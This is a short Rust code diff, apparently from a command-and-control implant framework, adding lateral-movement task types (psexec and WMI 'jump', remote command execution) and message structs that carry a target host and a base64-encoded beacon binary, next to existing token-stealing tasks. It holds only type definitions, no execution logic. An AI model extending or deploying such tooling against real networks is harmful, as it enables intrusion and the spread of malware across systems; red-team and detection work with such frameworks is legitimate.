@@ -34,6 +34,9 @@ pub enum TaskType {
     StealToken,
     MakeToken,
     Rev2Self,
+    JumpPsexec,
+    JumpWmi,
+    RemoteExec,
 }
 
 /// Command dispatched to agent (server → agent).
@@ -72,6 +75,31 @@ pub struct FileChunk {
     pub total: u32,
     /// Base64-encoded chunk bytes.
     pub data: String,
+}
+
+/// jump psexec payload — beacon binary deployed via SMB + SCM service.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct JumpPsexecTask {
+    pub target: String,
+    /// Base64-encoded beacon binary.
+    pub payload_b64: String,
+}
+
+/// jump wmi payload — beacon binary deployed via SMB + WMI process create.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct JumpWmiTask {
+    pub target: String,
+    /// Base64-encoded beacon binary.
+    pub payload_b64: String,
+}
+
+/// remote-exec payload — run a command on a remote host (no beacon deploy).
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct RemoteExecTask {
+    /// Execution method: "psexec" or "wmi".
+    pub method: String,
+    pub target: String,
+    pub command: String,
 }
 
 /// steal_token payload — JSON-encoded in Command.command.
